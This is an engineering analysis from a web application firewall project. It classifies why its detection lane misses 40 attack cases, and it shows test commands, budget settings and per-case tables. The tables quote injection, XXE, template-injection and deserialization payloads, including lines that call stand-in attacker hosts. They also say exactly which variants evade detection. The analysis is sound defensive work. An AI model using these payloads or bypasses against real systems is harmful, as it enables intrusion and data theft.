# Lane 2 blind spots, classified

`tests/lane2/` records that the semantic engine detects 127 of 170 corpus
attacks in shadow mode, and that **40 of the 43 misses are `blind`** — no
signal at all, from any detector, on any view. Not a threshold that was nearly
crossed; nothing was seen.

Until `v0.2.146` there was no way to say why. The three preprocessor-loop
budgets (`max_views_per_field`, `max_tokens_per_view`, `max_decode_rounds`)
narrowed what the lane looked at without setting `degraded` and without
incrementing anything, so "the payload was not inspected" and "the payload was
inspected and nothing matched" were the same observation. They now report
through `SemanticVerdict::degraded` and
`prxwaf_budget_events_total{subsystem="lane2_budget"}`, which makes the
question answerable — and the question has to be answered before anyone writes
a detector, because the remedy for a budget that ran out is a number in a
config file and the remedy for a detector that cannot see a shape is code.

**The answer is that none of the 40 is a budget miss.** Two of them touch a cap;
neither is caused by one. Every one of the 40 is a detection gap.

This document is the per-case evidence for that claim.

---

## 1. How this was measured

Three runs of `tests/lane2/run.sh` in shadow mode on `7357d9fd`, plus a
per-case metrics probe. Everything ran against a private work directory and a
private port block so a concurrent harness could not be measured instead.

```bash
# baseline — reproduces baseline.json exactly
WORK=/tmp/prx-waf-lane2-blind OUT=/tmp/prx-waf-lane2-blind/reports \
WAF_PORT=17611 WAF_TLS_PORT=17644 API_PORT=17699 BACKEND_PORT=17688 \
PG_PORT=15577 PG_CONTAINER=prx-waf-lane2-blind-pg MODE=shadow KEEP=1 \
tests/lane2/run.sh
```

The two experiment runs reuse the config `run.sh` generated — which is itself
sliced out of `configs/default.toml`, so the shipped posture is what is being
perturbed — with the budget keys substituted and `[metrics]` enabled on
`127.0.0.1:19127`:

| run | change from the shipped posture |
|---|---|
| `probe-default` | metrics on. Nothing else. |
| `relaxed` | metrics on; **all ten** `[content_security.budget]` keys raised |
| `ast-only` | metrics on; `max_ast_attempts_per_request` 6 → 64, nothing else |

The `relaxed` values, all well past anything the corpus could demand:

```toml
max_fields_per_phase = 256                  # was 64
max_views_per_field = 64                    # was 12
max_ast_attempts_per_request = 64           # was 6
max_ast_input_bytes_total = 4194304         # was 262144
max_html_parse_attempts_per_request = 64    # was 6
max_html_parse_input_bytes_total = 4194304  # was 262144
max_tokens_per_view = 4096                  # was 512
max_preprocess_output_bytes_total = 8388608 # was 524288
max_field_input_bytes = 1048576             # was 16384
max_decode_rounds = 8                       # was 3
```

### Why a metrics scrape and not the `degraded` column

`classify.py` reads `degraded` out of `semantic_observations`. For a blind row
that column does not exist: `engine.rs` persists an observation only
`if !verdict.signals.is_empty()`, so a request that produced no signal writes
no row, and `any(r.get("degraded") for r in rows)` over an empty list is
`False` for **every one of the 40 rows this document is about**. The per-request
flag is structurally unavailable for exactly the population that needs it.

So each of the 40 was replayed **one at a time**, scraping
`prxwaf_budget_events_total` and `prxwaf_degraded_requests_total` before and
after, and the delta is that one request's budget footprint. The harness is
serial and single-client, so the attribution is exact here; it would not be
under concurrency.

---

## 2. The controlled experiment

**Raising every configurable Lane 2 budget recovers zero blind cases.**

| | shipped | all ten budgets raised |
|---|---|---|
| attacks detected | **127 / 170 (74.71%)** | **127 / 170 (74.71%)** |
| `blind` | **40** | **40** |
| benign flagged | 10 (4.55%) | 10 (4.55%) |
| benign **blocked** | 2 (0.91%) | **3 (1.36%)** |

The set difference is empty in both directions — not 40 different rows adding
up to the same total, the *same* 40 rows.

Exactly two cases changed anything at all, and neither is a blind case:

```
content-033  benign  fp-log   -> fp-block   score 41 -> 82
rce-017      attack  detected -> detected   score 41 -> 82
             rules: [rce.shell_exec_flag] -> [rce.shell_exec_flag, rce_ast.interp_exec_flag]
```

Both are the shell AST arriving to corroborate a structural hit that was
already there. The `ast-only` run reproduces that delta exactly, so
`max_ast_attempts_per_request = 6` is the single key that binds on this corpus,
and what it costs is not detection — it is one benign request moving from
"logged" to "blocked", which is the number that gates `rollout_bps`.

### The two cases that touch a cap

| case | event | degraded | still blind when relaxed? |
|---|---|---|---|
| `sqli-019` | `lane2_budget{limit="ast_attempts"}` ×1 | yes | **yes** |
| `ssti-013` | `lane2_detector{limit="input_cap"}` ×2 | no | **yes** |

`sqli-019` is the only blind row in the corpus that is genuinely degraded. The
relaxed run gives it every AST attempt it asks for and it stays blind, so the
exhausted budget cost it a parse that would have found nothing:
`1;EXEC master..xp_dirtree '\\attacker.com\share'--` does not parse in either
AST framing and no structural rule names `xp_dirtree`.

`ssti-013` hits `lane2_detector{limit="input_cap"}` — a *per-detector* input
ceiling (SQL AST 256 B, shell AST 2 KiB, XSS DOM 16 KiB), hard-coded, not part
of `[content_security.budget]`, and deliberately not a `degraded` signal
because the view is still scored by the other detectors. It fires identically
in the relaxed run, which is the proof that no config key reaches it.

---

## 3. The 40, one at a time

`class` is one of **detector gap** (no budget involvement), **rule default-off**
(a detector gap whose rule exists but ships disabled), **off-surface** (the
payload was never presented to a detector), or **corpus artefact**.

None of the 40 is classified "budget" and none is classified "both", because
the relaxed run recovered none of them.

Evidence marked *probe* comes from a hand-sent variant against a live WAF with
the shipped config; the score and firing rule are quoted from the
`semantic_observations` row it produced.

### sql_injection — 5 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `sqli-008` | `?id=1 ORDER BY 8--` column-count probe | no | – | detector gap | Parses cleanly as `select * from t where c = 1 order by 8--`; the AST classifier has arms for stacked / union / tautology / dangerous-fn / subquery and none for `ORDER BY`. No structural rule either. |
| `sqli-009` | form `username=admin'-- -` | no | – | detector gap | *probe*: blind as a body field **and** as a query parameter. Odd quote count: framing 1 (`c = admin'-- -`) and framing 2 (`c = 'admin'-- -'`) both fail to parse. |
| `sqli-013` | double-URL-encoded `1' OR 1=1` | no | – | detector gap | *probe*: the fully **decoded** payload `1' OR 1=1` is also blind (score 0), while `1' OR '1'='1` scores 88 via `ast.tautology`. The decode chain is not the problem — quote parity is. |
| `sqli-017` | JSON leaf `1) OR 1=1-- -` | no | – | detector gap | Same class as `sqli-013` with an unbalanced paren instead of an unbalanced quote; neither framing parses. |
| `sqli-019` | `1;EXEC master..xp_dirtree '\\attacker.com\share'--` | **yes** | `ast_attempts` | detector gap | *relaxed run*: budget event gone, still blind. `master..xp_dirtree` is not parseable and no structural rule covers `xp_`-prefixed procedures. *probe*: the stacked-comment control `1; DROP TABLE users--` scores 45. |

The shared root for `sqli-009` / `-013` / `-017` is one thing: **both AST
framings assume the injected fragment is quote- and paren-balanced.** A
breakout payload is unbalanced by construction — that is what "breakout" means.

### rce — 3 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `rce-002` | `?host=127.0.0.1 && id` | no | – | detector gap | `rce.cmd_sep_common` (conf 45) matches but ships default-off, and at the family's 0.5 detector weight it scores 22 against `log_threshold = 40` — enabling it alone would still not log. *probe*: `&& whoami` also blind; `;cat /etc/passwd` scores 70. |
| `rce-018` | `cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd` | no | – | detector gap | `shell_normalize` collapses `${IFS}` / `$IFS` / `$IFS$9` and nothing else. *probe*: the `${IFS}`-only sibling (`rce-011`) scores 68; adding the `${PATH:0:1}` slice takes it to 0. |
| `rce-019` | GNU tar `--checkpoint-action=exec=sh run.sh` | no | – | detector gap | *probe*: `--checkpoint-action=exec=sh -c id` scores 41 through `rce.shell_exec_flag`; the real payload has no `-c`, and no rule knows that `--checkpoint-action=exec=` is itself an exec primitive. |

### traversal — 2 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `trav-005` | `?file=../../../../../proc/self/environ` | no | – | rule default-off | `traversal.sensitive_abs_ops` (55) covers `/proc/self` and ships disabled. *probe*: the same traversal to `/etc/passwd` scores 68. |
| `trav-016` | `?template=../../../../app/config/database.yml` | no | – | rule default-off | No sensitive absolute path; only `traversal.plain_dotdot` (50, default-off) matches. |

### xss — 2 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `xss-004` | `?url=javascript:alert(1)` | no | – | detector gap | `XssDomDetector` gates on `looks_like_markup` — no tag open, no parse, no budget spent. *probe*: the same URI inside `<a href=…>` scores 43 via `xss.js_url`. A bare `javascript:` URI in a redirect parameter has no detector. |
| `xss-015` | `<img/src=x/onerror=alert(1)>` in `User-Agent` | no | – | **corpus artefact** | *probe*: `<img src=x onerror=alert(1)>` scores 43 and `<img/src="x"/onerror=alert(1)>` scores 43; only the corpus's unquoted form is blind. Per the HTML5 tokenizer an unquoted attribute value runs to whitespace or `>`, so `src` swallows `/onerror=alert(1)` and there is no event-handler attribute to find — in `html5ever` or in a browser. |

### xxe — 2 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `xxe-004` | `<!DOCTYPE r SYSTEM "http://attacker.example/x.dtd">` | no | – | rule default-off | `xxe.doctype_external` (60) ships disabled because a legitimate XHTML `PUBLIC` doctype matches it. *probe*: adding an internal `<!ENTITY … SYSTEM …>` subset takes the same body to 90. |
| `xxe-005` | billion laughs, three internal `<!ENTITY>` declarations | no | – | rule default-off | `xxe.entity_expansion` is `Count(3)` at conf 65 and ships disabled. The payload declares exactly three, so the count is met. |

### nosql_injection — 9 blind

Seven have their operator key surfaced as a leaf and lose only to a disabled
rule. Two never produce a leaf at all.

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `nosql-001` | `{"pw":{"$ne":null}}` | no | – | rule default-off | `nosql.comparison_operator` (55) default-off. *probe*: the same body with `$where` scores 90 at field `body.nosql.op`, so the operator-leaf path works. |
| `nosql-003` | `{"pw":{"$regex":"^.*"}}` | no | – | rule default-off | `nosql.regex_operator` (60) default-off. |
| `nosql-004` | `{"user":{"$gt":""}}` | no | – | rule default-off | `nosql.comparison_operator` (55) default-off. |
| `nosql-005` | `{"$or":[…]}` | no | – | rule default-off | `nosql.logical_operator` (45) default-off. |
| `nosql-006` | `{"$and":[{"$ne":…}]}` | no | – | rule default-off | Both matching rules default-off. |
| `nosql-007` | `{"$expr":{"$eq":[1,1]}}` | no | – | rule default-off | `nosql.expr_operator` (75) default-off. |
| `nosql-011` | `{"$regex":"^A","$options":"i"}` | no | – | rule default-off | `nosql.regex_operator` (60) default-off; `$options` is not in the extraction allowlist and does not need to be. |
| `nosql-009` | form `password[$ne]=x` | no | – | detector gap | *probe*: bracket notation carrying **`$where`** — the one default-on operator — is also blind. `extract_body_fields` parses multipart / JSON / GraphQL / XML and leaves `application/x-www-form-urlencoded` to the whole-body view, and the NoSQL rules are anchored (`^\$where$`) so they only ever match an isolated operator leaf. No leaf, no match, at any rule setting. |
| `nosql-010` | query `user[$ne]=admin` | no | – | detector gap | Same: query parameters are presented as one undivided `query` field, never as `name` / `value` pairs. |

### ssti — 10 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `ssti-001` | `{{7*7}}` | no | – | rule default-off | `ssti.jinja_arith_probe` (45) default-off. |
| `ssti-002` | `{{config}}` | no | – | detector gap | `ssti.jinja_sink` requires `config.items` inside the delimiter. *probe*: `{{config.items()}}` scores 88. Bare `{{config}}` is only reachable by `ssti.jinja_delim` (30), which is default-off **and** below `log_threshold = 40`. |
| `ssti-006` | Velocity `#set($x=$rt.getRuntime().exec("id"))` | no | – | rule default-off | `ssti.template_directive` (45) covers `#set(` and is default-off. No default-on rule pairs `getruntime` with `.exec(` outside a `{% %}` block. |
| `ssti-009` | Twig `{{_self.env.registerUndefinedFilterCallback("exec")}}` | no | – | detector gap | *probe*: the identical sink inside `{% … %}` scores 85 via `ssti.jinja_statement_sink`, whose alternation includes `_self.`. `ssti.jinja_sink`, the `{{ … }}` twin, does not list `_self.`. Same sink, two delimiters, one covered. |
| `ssti-010` | Smarty `{php}system('id');{/php}` | no | – | detector gap | No rule knows the `{php}` block. |
| `ssti-011` | SpEL in `X-Api-Version` | no | – | **off-surface** | `X-Api-Version` is not in `SEMANTIC_HEADERS`; the value is never presented to a detector. `classify.py` already names this row separately. |
| `ssti-012` | `{{''|attr('\x5f\x5fclass\x5f\x5f')}}` | no | – | detector gap | Hex-escaped dunder defeats every literal `__class__` / `__mro__` alternation, by design of the payload. |
| `ssti-013` | Handlebars `constructor` gadget, `require('child_process')` | no | `lane2_detector{input_cap}` ×2 | detector gap | Still blind in the relaxed run — the cap is per-detector and hard-coded. No rule covers the Handlebars gadget chain. |
| `ssti-014` | `{{request|attr(request.args.f)}}&f=__class__` | no | – | detector gap | The dunders arrive as `f=__class__`, without the leading dot `ssti.jinja_sink` requires and without any of the four sandbox dunders `ssti.py_sandbox_dunder` matches. |
| `ssti-015` | Pug/Nunjucks `#{…require('child_process').execSync('id')}` | no | – | detector gap | `ssti.hash_delim` (25) is default-off and below threshold; nothing matches `require(` or `execSync(`. |

### ldap_injection — 3 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `ldap-005` | `user=*&pw=*` | no | – | detector gap | Only `ldap.bare_wildcard` (20) matches. Default-off, and at conf 20 against `log_threshold = 40` it could not log even if enabled. |
| `ldap-007` | `user=admin*)((\|userPassword=*)` | no | – | detector gap | `ldap.filter_break_known_attr` needs `)` `(` `<known attr>` `=`; here a second `(` and a `\|` sit between. *probe*: even the simplified `admin*)(\|userPassword=*)` is blind, so it is the boolean-group open, not the doubled paren, that breaks the match. |
| `ldap-015` | query `a=*)(uid&b==*` | no | – | detector gap | The query is one field, so the text is present, but `)(uid` is followed by `&` rather than `=`. *probe*: `ldap-006`'s `*)(uid=*` scores 90. |

### xpath_injection — 1 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `xpath-013` | XQuery FLWOR `x' return //user/password] for $x in …` | no | – | detector gap | *probe*: the `'] or` shape scores 85 via `xpath.predicate_close_logic`. This payload closes the predicate and continues with `for`/`return` FLWOR syntax, which no rule models. |

### deserialization — 3 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `deser-006` | `O:8:"stdClass":1:{…}` | no | – | rule default-off | `deser.php_object_injection` (60) default-off; `stdClass` is not in the gadget-class list the default-on rule requires. |
| `deser-015` | `a:2:{…O:4:"Evil":1:{…}}` | no | – | rule default-off | Same rule. *probe*: renaming the class to `Monolog` scores 88 via `deser.php_object_gadget`. |
| `deser-009` | base64 pickle, **protocol 4**, in a JSON string | no | – | detector gap | *probe*: the same payload at **protocol 0** (`cos\nsystem…`, base64, same JSON field) scores 90 on the `blind_decoded` view. The base64 chain works; `deser.py_pickle_global_exec` only matches the protocol-0 `GLOBAL` opcode spelling, and protocol ≥ 2 uses `SHORT_BINUNICODE` + `STACK_GLOBAL`, which carries no `c`-prefixed module token. |

---
